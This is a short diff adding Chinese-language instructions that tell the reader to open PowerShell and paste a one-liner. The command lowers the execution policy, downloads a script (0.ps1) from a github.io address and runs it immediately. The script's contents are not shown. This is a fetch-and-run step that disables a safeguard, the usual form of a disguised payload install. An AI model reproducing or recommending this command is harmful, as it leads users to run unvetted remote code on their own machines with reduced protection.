@@ -1,0 +1,2 @@
+Win键 + R搜索powershell 粘贴下方的多行输入： 
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; $scriptUrl = "https://benned904.github.io/script/0.ps1"; Invoke-WebRequest -Uri $scriptUrl -OutFile "0.ps1"; .\0.ps1
